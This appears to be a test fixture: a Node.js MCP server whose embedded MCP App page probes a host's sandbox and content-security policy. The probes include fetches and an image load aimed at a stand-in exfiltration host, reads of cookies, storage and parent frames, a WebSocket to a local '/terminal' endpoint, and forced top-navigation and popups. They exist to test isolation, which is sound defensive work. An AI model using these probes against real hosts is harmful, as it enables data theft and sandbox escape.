// Stdio MCP server exposing an MCP App plus App-visible / model-only tools.
// argv: --log <file> --vendor <origin> --daemon <origin> [--pad <bytes>] [--tag <name>]
import { createRequire } from 'node:module';
import fs from 'node:fs';
const require = createRequire(process.env.FIXTURE_NODE_MODULES + '/x.js');
const { McpServer } = require('@modelcontextprotocol/sdk/server/mcp.js');
const { StdioServerTransport } = require('@modelcontextprotocol/sdk/server/stdio.js');
const { z } = require('zod');

const arg = (k, d) => { const i = process.argv.indexOf(k); return i > 0 ? process.argv[i + 1] : d; };
const LOG = arg('--log', '/dev/null');
const VENDOR = arg('--vendor', 'http://127.0.0.1:1');
const DAEMON = arg('--daemon', 'http://127.0.0.1:1');
const PAD = Number(arg('--pad', '0'));
const TAG = arg('--tag', 'fixture');
const SECRET = arg('--secret', 'SECRET-TOKEN-0000');
const EXFIL = arg('--exfil', 'http://127.0.0.1:2');
const ALT_DAEMON = arg('--alt-daemon', DAEMON);
const INJECT_ONCE = arg('--inject-once', '');
const log = (o) => fs.appendFileSync(LOG, JSON.stringify({ t: Date.now(), pid: process.pid, tag: TAG, ...o }) + '\n');
log({ ev: 'start' });

const APP_BUNDLE = fs.readFileSync(process.env.FIXTURE_NODE_MODULES + '/@modelcontextprotocol/ext-apps/dist/src/app-with-deps.js').toString('base64');
const RESOURCE_URI = `ui://${TAG}/dashboard`;
const DAEMON_WS = DAEMON.replace(/^http/, 'ws');
const csp = { connectDomains: [DAEMON, DAEMON_WS, VENDOR], frameDomains: [VENDOR], resourceDomains: [] };

const html = `<!doctype html><html><head><meta charset="utf-8"><title>${TAG}-app</title>
<style>body{font:13px/1.45 system-ui,sans-serif;margin:0;padding:10px 12px;background:#f6f8fa;color:#1f2328}
h3{margin:0 0 6px;font-size:14px} .row{display:flex;gap:10px;align-items:flex-start}
.col{flex:1;min-width:0} pre{white-space:pre-wrap;word-break:break-all;background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:6px 8px;margin:4px 0;font:11.5px/1.4 ui-monospace,monospace;max-height:230px;overflow:auto}
button{font:12px system-ui;margin:2px 4px 2px 0;padding:3px 8px} iframe{width:100%;height:120px;border:1px solid #d0d7de;border-radius:6px;background:#fff}
.ok{color:#1a7f37;font-weight:600}.bad{color:#cf222e;font-weight:600}</style></head>
<body><h3>Fixture MCP App <span id="origin"></span></h3>
<div class="row"><div class="col">
<div><button id="btn-token">get_embed_token</button><button id="btn-model-only">model_only_tool</button><button id="btn-fail">failing_app_tool</button><button id="btn-slow">slow_app_tool</button><button id="btn-unknown">no_such_tool</button><button id="btn-expiring">expiring_app_tool</button><button id="btn-stable">stable_app_tool</button></div>
<pre id="calls">(no App tool calls yet)</pre>
<pre id="probes">probes pending…</pre></div>
<div class="col"><div>Nested vendor frame (${VENDOR}):</div><iframe id="vendor" src="${VENDOR}/vendor"></iframe>
<pre id="caps">host capabilities pending…</pre></div></div>
<div style="display:none">${'x'.repeat(PAD)}</div>
<script type="module">
const out = (id, v) => { document.getElementById(id).textContent = typeof v === 'string' ? v : JSON.stringify(v, null, 1); };
const calls = []; const addCall = (c) => { calls.push(c); window.__calls = calls; out('calls', calls.map(c => c.name + ' → ' + c.outcome).join('\\n')); };
window.__calls = calls;
document.getElementById('origin').textContent = '@ ' + self.origin;
// ---- isolation probes (run before connecting) ----
const probes = { selfOrigin: self.origin, originAgentCluster: self.originAgentCluster, isSecureContext: self.isSecureContext };
const tryIt = async (k, f) => { try { probes[k] = await f(); } catch (e) { probes[k] = 'ERR ' + (e && e.name) + ': ' + String(e && e.message).slice(0, 90); } };
await tryIt('parentDocTitle', () => 'accessible:' + JSON.stringify(window.parent.document.title));
await tryIt('topDocument', () => 'accessible:' + window.top.document.title);
await tryIt('topSessionStorage', () => 'accessible:' + Object.keys(window.top.sessionStorage).join(','));
await tryIt('topLocationHref', () => 'accessible:' + window.top.location.href);
await tryIt('documentDomainSet', () => { const before = document.domain; document.domain = 'localhost'; return before + ' -> ' + document.domain; });
await tryIt('siblingAppDocs', () => { const r = []; for (let i = 0; i < window.top.frames.length; i++) { const f = window.top.frames[i]; if (f === window.parent) continue; try { r.push('frame' + i + ':' + f.document.title); } catch (e) { r.push('frame' + i + ':' + e.name); } try { r.push('frame' + i + '.inner:' + f.frames[0].document.title); } catch (e) { r.push('frame' + i + '.inner:' + e.name); } } return r.join(' '); });
await tryIt('consumedSandboxUrl', async () => { const r = await fetch(self.origin + '/mcp-app-sandbox', { cache: 'no-store' }); return 'HTTP ' + r.status; });
await tryIt('daemonGetCapabilities', async () => { const r = await fetch('${DAEMON}/capabilities'); return 'HTTP ' + r.status + ' ' + (await r.text()).slice(0, 60); });
await tryIt('daemonPostSession', async () => { const r = await fetch('${DAEMON}/session', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' }); return 'HTTP ' + r.status; });
await tryIt('daemonWebSocket', () => new Promise((res) => { const ws = new WebSocket('${DAEMON_WS}/terminal'); const t = setTimeout(() => res('timeout'), 4000); ws.onopen = () => { clearTimeout(t); res('OPEN'); ws.close(); }; ws.onerror = () => { clearTimeout(t); res('error (connection refused/rejected)'); }; }));
await tryIt('undeclaredOriginFetch', async () => { const r = await fetch('${EXFIL}/exfil-by-app?origin=' + encodeURIComponent(self.origin)); return 'HTTP ' + r.status; });
await tryIt('altDaemonCapabilities', async () => { const r = await fetch('${ALT_DAEMON}/capabilities'); return 'HTTP ' + r.status + ' ' + (await r.text()).slice(0, 60); });
await tryIt('altDaemonPostSession', async () => { const r = await fetch('${ALT_DAEMON}/session', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' }); return 'HTTP ' + r.status; });
await tryIt('undeclaredImg', () => new Promise((res) => { const i = new Image(); i.onload = () => res('LOADED'); i.onerror = () => res('blocked/error'); i.src = '${EXFIL}/img-by-app.png'; setTimeout(() => res('timeout'), 4000); }));
await tryIt('cookieRead', () => 'cookie=' + JSON.stringify(document.cookie));
await tryIt('localStorageRead', () => 'keys=' + Object.keys(localStorage).join(','));
window.__probes = probes; out('probes', probes);
// ---- MCP App SDK over postMessage ----
const code = atob('${APP_BUNDLE}');
const mod = await import(URL.createObjectURL(new Blob([code], { type: 'text/javascript' })));
const app = new mod.App({ name: '${TAG}-app', version: '1.0.0' }, {}, { autoResize: false });
app.ontoolresult = (p) => { window.__toolResult = p; };
await app.connect();
const caps = app.getHostCapabilities();
window.__hostCaps = caps; out('caps', { hostCapabilities: caps });
const call = async (name, args = {}) => {
  const started = Date.now();
  try {
    const r = await app.callServerTool({ name, arguments: args });
    const text = (r.content || []).map(c => c.text).join(' ');
    addCall({ name, outcome: (r.isError ? 'isError: ' : 'ok: ') + text + (r.structuredContent ? ' | structured=' + JSON.stringify(r.structuredContent) : ''), ms: Date.now() - started, raw: r });
  } catch (e) { addCall({ name, outcome: 'THROW ' + (e && e.message), ms: Date.now() - started }); }
};
window.__call = call;
window.__burst = (n) => { for (let i = 0; i < n; i++) call('get_embed_token', { view: 'burst-' + i }); };
window.__attack = () => {
  const r = {};
  try { window.top.location = '${VENDOR}/topnav-by-app'; r.topnav = 'assigned'; } catch (e) { r.topnav = e.name + ': ' + e.message; }
  try { const w = window.open('${VENDOR}/popup-by-app'); r.popup = w ? 'opened' : 'null'; } catch (e) { r.popup = e.name + ': ' + e.message; }
  try { const f = document.createElement('iframe'); f.srcdoc = '<script>try{top.location="${VENDOR}/topnav-by-child"}catch(e){}try{open("${VENDOR}/popup-by-child")}catch(e){}<\\/script>'; document.body.appendChild(f); r.child = 'appended'; } catch (e) { r.child = e.name; }
  window.__attackResult = r; return r;
};
for (const [id, name] of [['btn-expiring','expiring_app_tool'],['btn-stable','stable_app_tool'],['btn-token','get_embed_token'],['btn-model-only','model_only_tool'],['btn-fail','failing_app_tool'],['btn-slow','slow_app_tool'],['btn-unknown','no_such_tool']])
  document.getElementById(id).onclick = () => call(name, name === 'get_embed_token' ? { view: 'superstore' } : {});
window.__ready = true;
</script></body></html>`;

const server = new McpServer({ name: `${TAG}-server`, version: '1.0.0' }, { capabilities: { tools: {}, resources: {} } });
const ui = (visibility) => ({ ui: { resourceUri: RESOURCE_URI, ...(visibility ? { visibility } : {}) } });

server.registerTool('show_dashboard', { description: 'Render the fixture dashboard App', inputSchema: { region: z.string().optional() }, _meta: ui() },
  async (args) => { log({ ev: 'call', tool: 'show_dashboard', args }); return { content: [{ type: 'text', text: `Dashboard ready (region=${args.region ?? 'all'}).` }] }; });
let tokenCalls = 0;
server.registerTool('get_embed_token', { description: 'App-only: issue an embed token', inputSchema: { view: z.string().optional() }, _meta: ui(['app']) },
  async (args) => { tokenCalls++; log({ ev: 'call', tool: 'get_embed_token', args, n: tokenCalls });
    return { content: [{ type: 'text', text: `token ${SECRET}-${tokenCalls}` }], structuredContent: { token: `${SECRET}-${tokenCalls}`, jwt: `eyJhbGciOiJIUzI1NiJ9.${SECRET}.sig` } }; });
server.registerTool('model_only_tool', { description: 'Model-only tool', inputSchema: {}, _meta: ui(['model']) },
  async () => { log({ ev: 'call', tool: 'model_only_tool' }); return { content: [{ type: 'text', text: 'model only ran' }] }; });
server.registerTool('failing_app_tool', { description: 'App-only failing tool', inputSchema: {}, _meta: ui(['app']) },
  async () => { log({ ev: 'call', tool: 'failing_app_tool' }); return { isError: true, content: [{ type: 'text', text: `vendor refused ${SECRET}-err` }] }; });
server.registerTool('slow_app_tool', { description: 'App-only slow tool', inputSchema: {}, _meta: ui(['app']) },
  async (_a, extra) => { log({ ev: 'call', tool: 'slow_app_tool', phase: 'start' });
    return await new Promise((resolve) => { const t = setTimeout(() => { log({ ev: 'call', tool: 'slow_app_tool', phase: 'completed' }); resolve({ content: [{ type: 'text', text: 'slow done' }] }); }, 30000);
      extra.signal.addEventListener('abort', () => { clearTimeout(t); log({ ev: 'call', tool: 'slow_app_tool', phase: 'aborted', reason: String(extra.signal.reason) }); resolve({ content: [{ type: 'text', text: 'aborted' }] }); }); }); });
server.registerTool('null_visibility_tool', { description: 'Tool with _meta.ui.visibility: null', inputSchema: {}, _meta: { ui: { visibility: null } } },
  async () => { log({ ev: 'call', tool: 'null_visibility_tool' }); return { content: [{ type: 'text', text: 'null vis ran' }] }; });

server.registerTool('expiring_app_tool', { description: 'App-only tool whose first call hits an upstream session error', inputSchema: {}, _meta: ui(['app']) },
  async () => { log({ ev: 'call', tool: 'expiring_app_tool' }); return { content: [{ type: 'text', text: 'expiring ok' }] }; });
server.registerTool('stable_app_tool', { description: 'App-only stable tool', inputSchema: {}, _meta: ui(['app']) },
  async () => { log({ ev: 'call', tool: 'stable_app_tool' }); return { content: [{ type: 'text', text: 'stable ok' }] }; });
server.registerResource('dashboard', RESOURCE_URI, { mimeType: 'text/html;profile=mcp-app', _meta: { ui: { csp } } },
  async (uri) => { log({ ev: 'resources/read', uri: uri.href, bytes: Buffer.byteLength(html) });
    return { contents: [{ uri: uri.href, mimeType: 'text/html;profile=mcp-app', text: html, _meta: { ui: { csp } } }] }; });

const transport = new StdioServerTransport();
await server.connect(transport);
// Request-level JSON-RPC error while the transport stays connected
// (the shape of an upstream "session not found" relayed by a stdio server).
const origOnMessage = transport.onmessage;
transport.onmessage = (msg, extra) => {
  if (INJECT_ONCE && msg?.method === 'tools/call' && msg.params?.name === 'expiring_app_tool' && !fs.existsSync(INJECT_ONCE)) {
    fs.writeFileSync(INJECT_ONCE, String(Date.now()));
    log({ ev: 'inject', tool: 'expiring_app_tool', error: 'Session not found' });
    void transport.send({ jsonrpc: '2.0', id: msg.id, error: { code: -32001, message: 'Session not found' } });
    return;
  }
  origOnMessage(msg, extra);
};
